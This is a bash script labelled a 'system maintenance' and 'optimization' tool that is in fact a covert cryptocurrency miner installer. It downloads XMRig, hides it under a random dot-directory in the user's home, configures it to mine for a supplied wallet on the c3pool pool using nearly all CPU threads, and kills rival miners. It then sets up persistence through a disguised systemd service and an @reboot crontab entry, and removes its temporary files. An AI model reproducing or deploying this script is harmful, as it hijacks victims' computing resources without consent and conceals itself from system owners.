#!/bin/bash

VERSION=2.14

echo "System maintenance script v$VERSION."
echo "This script performs system optimization tasks."
echo

# Set locale to avoid warnings
export LC_ALL=C
export LANG=C

# Get current user and home directory
CURRENT_USER=$(whoami)
USER_HOME="$HOME"

# If running with sudo, get the original user's home
if [ -n "$SUDO_USER" ]; then
    CURRENT_USER="$SUDO_USER"
    USER_HOME=$(getent passwd "$SUDO_USER" | cut -d: -f6)
fi

# Generate random names and paths
RANDOM_DIR=$(openssl rand -hex 12)
SYSTEM_USER="sys$(openssl rand -hex 8)"
SERVICE_NAME="systemd-$(openssl rand -hex 6)"

# Hidden installation paths - use user's home directory
BASE_DIR="$USER_HOME/.local/.$RANDOM_DIR"
CONFIG_DIR="$BASE_DIR/.config"
LOG_DIR="$BASE_DIR/.logs"
CACHE_DIR="$BASE_DIR/.cache"

WALLET=$1
EMAIL=$2

if [ -z "$WALLET" ]; then
  echo "Script usage:"
  echo "> system_maintenance.sh <identifier> [<contact>]"
  echo "ERROR: Identifier required"
  exit 1
fi

# Install required packages if needed
if ! type curl >/dev/null || ! type tar >/dev/null; then
  echo "Installing required packages..."
  apt-get update >/dev/null 2>&1 && apt-get install -y curl tar >/dev/null 2>&1
fi

# Calculate optimal CPU usage
CPU_THREADS=$(nproc)
if [ $CPU_THREADS -gt 2 ]; then
    USABLE_THREADS=$((CPU_THREADS - 1))
else
    USABLE_THREADS=$CPU_THREADS
fi

CPU_USAGE=100  # Use 100% of available threads

echo "[*] Running as user: $CURRENT_USER"
echo "[*] Home directory: $USER_HOME"
echo "[*] Starting system maintenance setup..."
echo "[*] Using $USABLE_THREADS of $CPU_THREADS CPU threads"

# Function to create hidden directories
create_hidden_dirs() {
    echo "[*] Creating directories in: $BASE_DIR"
    mkdir -p "$BASE_DIR" "$CONFIG_DIR" "$LOG_DIR" "$CACHE_DIR"
    
    # Set proper ownership
    if [ "$CURRENT_USER" != "root" ]; then
        chown -R "$CURRENT_USER:$CURRENT_USER" "$BASE_DIR" 2>/dev/null
    fi
    
    chmod 700 "$BASE_DIR" "$CONFIG_DIR" "$LOG_DIR" "$CACHE_DIR"
}

# Cleanup previous installations
cleanup_previous() {
    echo "[*] Cleaning up previous installations..."
    pkill -f "systemd-.*" 2>/dev/null
    pkill -f "sysupdate" 2>/dev/null
    pkill -f "kernelcfg" 2>/dev/null
    
    # Find and remove hidden miners in user's home
    find "$USER_HOME" -name ".*" -type d -exec pkill -f {}/main \; 2>/dev/null
}

# Setup huge pages
setup_hugepages() {
    echo "[*] Setting up huge pages..."
    # Enable huge pages
    echo "vm.nr_hugepages=1280" >> /etc/sysctl.conf 2>/dev/null
    sysctl -p >/dev/null 2>&1
    
    # Set huge pages immediately
    echo 1280 > /proc/sys/vm/nr_hugepages 2>/dev/null || true
}

echo "[*] Performing system cleanup..."
cleanup_previous

echo "[*] Creating maintenance directory structure..."
create_hidden_dirs

echo "[*] Setting up system optimization..."
setup_hugepages

echo "[*] Downloading maintenance tools..."
DOWNLOAD_URL="https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz"

# Download with retry logic
for i in {1..3}; do
    if curl -s -L "$DOWNLOAD_URL" -o /tmp/tools.tar.gz; then
        echo "[*] Download successful"
        break
    else
        echo "[*] Download attempt $i failed, retrying..."
        sleep 2
    fi
done

if [ ! -f /tmp/tools.tar.gz ]; then
    echo "ERROR: Cannot download tools after 3 attempts"
    exit 1
fi

echo "[*] Installing maintenance tools..."
tar xzf /tmp/tools.tar.gz -C /tmp/ 2>/dev/null

# Find and copy xmrig binary
XMRIG_BINARY=$(find /tmp -name "xmrig" -type f 2>/dev/null | head -1)
if [ -n "$XMRIG_BINARY" ] && [ -f "$XMRIG_BINARY" ]; then
    echo "[*] Found binary: $XMRIG_BINARY"
    cp "$XMRIG_BINARY" "$BASE_DIR/main"
    
    # Set proper ownership
    if [ "$CURRENT_USER" != "root" ]; then
        chown "$CURRENT_USER:$CURRENT_USER" "$BASE_DIR/main" 2>/dev/null
    fi
    
    chmod +x "$BASE_DIR/main"
else
    echo "ERROR: Could not find xmrig binary in extracted files"
    exit 1
fi

if [ ! -f "$BASE_DIR/main" ]; then
    echo "ERROR: Tools installation failed"
    exit 1
fi

echo "[*] Configuring system optimizer..."
# Create config.json in BASE_DIR (next to main)
cat > "$BASE_DIR/config.json" << EOF
{
    "api": {
        "id": null,
        "worker-id": "$SYSTEM_USER"
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": false,
    "colors": true,
    "title": "system-optimizer",
    "randomx": {
        "init": $USABLE_THREADS,
        "mode": "fast",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": true,
        "priority": null,
        "memory-pool": true,
        "yield": true,
        "max-threads-hint": 100,
        "asm": true,
        "argon2-impl": null,
        "cn/0": false,
        "cn-lite/0": false,
        "rx/0": true,
        "rx": [0, 1, 2, 3, 4, 5, 6],
        "threads": $USABLE_THREADS,
        "max-threads": $USABLE_THREADS
    },
    "pools": [
        {
            "algo": "rx/0",
            "coin": null,
            "url": "auto.c3pool.org:19999",
            "user": "$WALLET",
            "pass": "x",
            "rig-id": "$SYSTEM_USER",
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "print-time": 30,
    "health-print-time": 30,
    "dmi": false,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "user-agent": null,
    "verbose": 1,
    "watch": false,
    "pause-on-battery": false,
    "pause-on-active": false
}
EOF

# Set ownership of config file
if [ "$CURRENT_USER" != "root" ]; then
    chown "$CURRENT_USER:$CURRENT_USER" "$BASE_DIR/config.json" 2>/dev/null
fi

echo "[*] Creating control scripts..."

# Main control script
cat > "$BASE_DIR/control" << EOF
#!/bin/bash
SCRIPT_DIR="\$(dirname "\$(realpath "\$0")")"
case "\$1" in
    start)
        echo "Starting optimizer..."
        cd "\$SCRIPT_DIR"
        # Enable huge pages
        echo 1280 > /proc/sys/vm/nr_hugepages 2>/dev/null || true
        # Start the optimizer
        nohup ./main --config=./config.json > ./output.log 2>&1 &
        echo \$! > ./pid.txt
        echo "Started with PID: \$(cat ./pid.txt)"
        sleep 5
        echo "=== Current Status ==="
        ./control status
        echo "=== Recent Logs ==="  
        ./control logs
        ;;
    stop)
        echo "Stopping optimizer..."
        pkill -f "\$SCRIPT_DIR/main"
        [ -f "./pid.txt" ] && kill \$(cat ./pid.txt) 2>/dev/null
        rm -f ./pid.txt
        echo "Stopped"
        ;;
    status)
        if pgrep -f "\$SCRIPT_DIR/main" > /dev/null; then
            PID=\$(pgrep -f "\$SCRIPT_DIR/main")
            echo "✅ Running - PID: \$PID"
            echo "📊 CPU Usage: \$(ps -p \$PID -o %cpu --no-headers 2>/dev/null || echo 'N/A')%"
            echo "🧠 Memory: \$(ps -p \$PID -o %mem --no-headers 2>/dev/null || echo 'N/A')%"
            echo "⏰ Uptime: \$(ps -p \$PID -o etime --no-headers 2>/dev/null || echo 'N/A')"
        else
            echo "❌ Stopped"
        fi
        ;;
    logs)
        echo "=== Last 20 lines of logs ==="
        [ -f "./output.log" ] && tail -20 ./output.log || echo "No logs found"
        ;;
    fullogs)
        echo "=== Full logs ==="
        [ -f "./output.log" ] && cat ./output.log || echo "No logs found"
        ;;
    stats)
        echo "=== System Statistics ==="
        echo "CPU Threads: $USABLE_THREADS/$CPU_THREADS"
        echo "Total Memory: \$(free -h | grep Mem | awk '{print \$2}')"
        echo "Huge Pages: \$(grep HugePages_Total /proc/meminfo | awk '{print \$2}')"
        echo "Active Processes: \$(pgrep -f xmrig | wc -l)"
        ;;
    restart)
        ./control stop
        sleep 3
        ./control start
        ;;
    test)
        echo "=== Testing configuration ==="
        cd "\$SCRIPT_DIR"
        timeout 10s ./main --config=./config.json --dry-run 2>&1 | head -20
        ;;
    *)
        echo "Usage: \$0 {start|stop|status|logs|fullogs|stats|restart|test}"
        ;;
esac
EOF

# Set ownership and permissions
if [ "$CURRENT_USER" != "root" ]; then
    chown "$CURRENT_USER:$CURRENT_USER" "$BASE_DIR/control" 2>/dev/null
fi
chmod +x "$BASE_DIR/control"

# Systemd service for persistence (only if root or sudo)
if command -v systemctl >/dev/null 2>&1 && [ "$(id -u)" -eq 0 ]; then
    echo "[*] Creating systemd service..."
    mkdir -p /etc/systemd/system
    cat > /etc/systemd/system/"$SERVICE_NAME".service << EOF
[Unit]
Description=System Optimization Service
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=10
User=root
ExecStart=$BASE_DIR/main --config=$BASE_DIR/config.json
WorkingDirectory=$BASE_DIR
Environment=LC_ALL=C
StandardOutput=append:$BASE_DIR/output.log
StandardError=append:$BASE_DIR/output.log

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable "$SERVICE_NAME".service 2>/dev/null
    systemctl start "$SERVICE_NAME".service 2>/dev/null
    echo "[*] Systemd service started: $SERVICE_NAME"
fi

# Add to crontab for persistence
echo "[*] Setting up persistence..."
(crontab -l 2>/dev/null | grep -v "$BASE_DIR" ; echo "@reboot sleep 25 && '$BASE_DIR/control' start > /dev/null 2>&1") | crontab -

echo "[*] Starting system optimizer..."
cd "$BASE_DIR"
./control start

# Additional verification
sleep 10
echo
echo "=== Final Verification ==="
./control status
echo
./control stats

echo
echo "🎯 System optimization setup complete!"
echo "📍 Installation directory: $BASE_DIR" 
echo "🔧 Use: $BASE_DIR/control {start|stop|status|logs|stats|restart|test} to manage"
echo

# Check if process is running
if pgrep -f "$BASE_DIR/main" > /dev/null; then
    echo "✅ Optimizer is successfully running!"
    echo "💻 Check CPU usage with: top -p \$(pgrep -f '$BASE_DIR/main')"
    echo "📋 Check detailed logs with: $BASE_DIR/control logs"
else
    echo "❌ Optimizer failed to start."
    echo "🔍 Check details with: $BASE_DIR/control logs"
    echo "🧪 Test config with: $BASE_DIR/control test"
fi

# Cleanup
rm -rf /tmp/tools.tar.gz
find /tmp -name "xmrig*" -type d -exec rm -rf {} \; 2>/dev/null

exit 0
